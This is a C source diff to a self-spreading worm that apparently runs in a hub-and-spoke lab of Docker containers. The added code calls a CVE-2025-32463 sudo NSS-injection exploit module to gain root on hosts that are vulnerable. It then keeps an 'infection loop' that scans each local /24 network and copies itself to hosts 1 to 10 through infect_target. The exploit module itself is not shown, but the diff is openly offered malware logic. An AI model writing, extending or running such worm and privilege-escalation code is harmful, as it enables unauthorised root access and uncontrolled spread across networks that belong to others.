@@ -16,6 +16,7 @@
 #include <stdint.h>
 #include <dirent.h>
 #include <ifaddrs.h>
+#include "cve_2025_32463.h"
 
 // Configuration
 #define MAX_SUBNETS 4
@@ -550,6 +551,23 @@ int main(int argc, char* argv[]) {
     // Delay to allow system to settle if just started
     sleep(2);
     
+    // Attempt privilege escalation on spoke servers (before SSH key check)
+    // Spoke servers have vulnerable sudo installed, so we can detect them by checking for the vulnerability
+    // This works better than hostname checking since Docker containers have random hostnames
+    printf("\n[*] Checking for CVE-2025-32463 (Sudo NSS Injection)...\n");
+    if (cve_2025_32463_scan()) {
+        printf("[+] CVE-2025-32463 vulnerability detected! This appears to be a spoke server.\n");
+        printf("[+] Attempting privilege escalation...\n");
+        if (cve_2025_32463_execute()) {
+            printf("[+] Privilege escalation successful! Continuing as root...\n");
+        } else {
+            printf("[-] Privilege escalation failed, continuing as unprivileged user\n");
+        }
+    } else {
+        printf("[-] CVE-2025-32463 not applicable (sudo version not vulnerable or not installed)\n");
+        printf("[*] This appears to be the hub server, skipping privilege escalation\n");
+    }
+    
     // Check if SSH keys exist
     int keys_found = read_ssh_key();
     if (keys_found == 0) {
@@ -594,24 +612,26 @@ int main(int argc, char* argv[]) {
         free(local_ips[i]);
     }
     
-    printf("[+] Found %d local IP(s), scanning %d unique network(s)\n", local_ip_count, unique_network_count);    // Infection loop
-        printf("\n[*] Starting infection round...\n");
+    printf("[+] Found %d local IP(s), scanning %d unique network(s)\n", local_ip_count, unique_network_count);
+    
+    // Infection loop
+    printf("\n[*] Starting infection round...\n");
+    
+    // Scan all unique networks
+    for (int net_idx = 0; net_idx < unique_network_count; net_idx++) {
+        char* network = unique_networks[net_idx];
+        char base_network[INET_ADDRSTRLEN];
+        strncpy(base_network, network, strlen(network) - 2);
+        base_network[strlen(network) - 2] = '\0';
+        printf("[+] Scanning network: %s/24\n", network);
         
-        // Scan all unique networks
-        for (int net_idx = 0; net_idx < unique_network_count; net_idx++) {
-            char* network = unique_networks[net_idx];
-            char base_network[INET_ADDRSTRLEN];
-            strncpy(base_network, network, strlen(network) - 2);
-            base_network[strlen(network) - 2] = '\0';
-            printf("[+] Scanning network: %s/24\n", network);
+        for (int host = 1; host <= 10; host++) {
+            char ip[MAX_IP_LEN];
+            snprintf(ip, sizeof(ip), "%s.%d", base_network, host);
             
-            for (int host = 1; host <= 10; host++) {
-                char ip[MAX_IP_LEN];
-                snprintf(ip, sizeof(ip), "%s.%d", base_network, host);
-                
-                infect_target(ip, argv[0]);
-            }
+            infect_target(ip, argv[0]);
         }
+    }
     return 0;
 }
 
